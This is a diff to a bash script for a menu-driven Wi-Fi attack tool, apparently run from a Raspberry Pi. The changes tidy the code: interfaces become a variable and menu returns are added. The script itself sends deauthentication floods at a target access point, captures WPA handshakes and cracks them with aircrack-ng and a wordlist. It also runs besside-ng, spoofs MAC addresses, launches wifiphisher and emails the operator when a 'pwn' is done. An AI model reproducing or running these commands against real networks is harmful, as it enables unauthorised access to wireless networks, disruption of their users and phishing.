@@ -42,8 +42,8 @@ fi
 
 
 checkServices () {
-sudo systemctl start postfix 
-sudo systemctl start ssh 
+sudo systemctl start postfix
+
 
 }
 
@@ -246,13 +246,10 @@ monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 sudo aireplay-ng --deauth 20 -a $bssid $foo
-sudo chmod -R 755 *
 sudo airmon-ng stop $foo
-sudo ifconfig $foo up
-sudo systemctl start NetworkManager
 checkServices 
 sleep 10
-sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP* "
+sendemail -f airscript@mail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP* "
 crack
 }
 
@@ -262,14 +259,9 @@ network
 PiScan
 monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-#sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 11 --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 sudo aireplay-ng --deauth 20 -a $bssid $foo
-#sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 $foo
-sudo chmod -R 755 air-script
-sudo airmon-ng stop $foo
-sudo ifconfig $foo up
-sudo systemctl start NetworkManager
+sudo airmon-ng stop $foo > /dev/null 2>&1
 checkServices 
 crack
 
@@ -310,12 +302,9 @@ network
 PiPwn
 sudo besside-ng $foo
 stopMon
-sudo ifconfig $foo up
-sudo systemctl start NetworkManager
-sudo chmod -R 755 air-crack
 checkservices
 sleep 10
-sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
+sendemail -f airscript@mail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
 crack
 }
 
@@ -325,8 +314,6 @@ network
 PiPwn
 sudo besside-ng $foo
 stopMon
-sudo ifconfig $foo up
-sudo systemctl start NetworkManager
 sudo chmod -R 755 air-crack
 echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
 checkservices
@@ -385,7 +372,7 @@ cd wifite2
 sudo ./Wifite.py
 }
 
-crack() {
+crack () {
 echo "Your current directory:"
 pwd
 ls
@@ -397,6 +384,7 @@ sudo aircrack-ng -w $wordlist *.cap
 #sudo aircrack-ng -w wordlist.txt wep.cap
 #sudo aircrack-ng -w wordlist.txt wpa.cap
 #sudo aircrack-ng -w wordlist.txt *.cap
+menu
 }
 
 StartWifiphisher () {
@@ -497,6 +485,7 @@ sudo ifconfig $foo down
 sudo macchanger -r $foo
 sudo ifconfig $foo up
 macchanger -s $foo
+menu
 }
 
 RestoreMAC(){
@@ -505,13 +494,13 @@ sudo ifconfig $foo down
 sudo macchanger -p $foo
 sudo ifconfig $foo up
 sudo macchanger -s $foo
-
+menu
 }
 
 showMAC() {
 networkselect
 macchanger -s $foo
-
+menu
 
 
 }
@@ -900,32 +889,11 @@ sudo ./uninstall.sh
 }
 
 stopMon () {
-sudo airmon-ng stop wlan0mon > /dev/null 2>&1
-sudo airmon-ng stop wlan1mon > /dev/null 2>&1
-sudo airmon-ng stop wlan2mon > /dev/null 2>&1
-sudo airmon-ng stop wlan3mon > /dev/null 2>&1
-sudo airmon-ng stop wlan4mon > /dev/null 2>&1
-sudo airmon-ng stop wlan5mon > /dev/null 2>&1
-sudo airmon-ng stop wlan7mon > /dev/null 2>&1
-sudo airmon-ng stop wlan8mon > /dev/null 2>&1
-sudo airmon-ng stop wlan9mon > /dev/null 2>&1
-sudo airmon-ng stop wlan10mon > /dev/null 2>&1
+sudo airmon-ng stop $foo > /dev/null 2>&1
 sudo service network-mamager start > /dev/null 2>&1
 sudo service network-mamager restart > /dev/null 2>&1
-sudo ifconfig wlan0 up > /dev/null 2>&1
-sudo ifconfig wlan1 up > /dev/null 2>&1
-sudo ifconfig wlan2 up > /dev/null 2>&1
-sudo ifconfig wlan3 up > /dev/null 2>&1
-sudo ifconfig wlan4 up > /dev/null 2>&1
-sudo ifconfig wlan6 up > /dev/null 2>&1
-sudo ifconfig wlan7 up > /dev/null 2>&1
-sudo ifconfig wlan8 up > /dev/null 2>&1
-sudo ifconfig wlan9 up > /dev/null 2>&1
-sudo ifconfig wlan10 up > /dev/null 2>&1
-
-
+sudo ifconfig $foo up > /dev/null 2>&1
 sudo wpa_suplicant > /dev/null 2>&1
-
 }
 
 
@@ -938,7 +906,7 @@ echo "$(tput setaf 2)INSTRUCTIONS:
 METHOD 1: (SSH/AD HOC METHOD)
 
 Step 1: Once established connection to Pi via Hotspot or Ad Hoc
-run command "sudo ./air-script.sh"
+run command "sudo ./pwn.sh"
 Step 2: Select an attack
 --------------------------------------------------
 
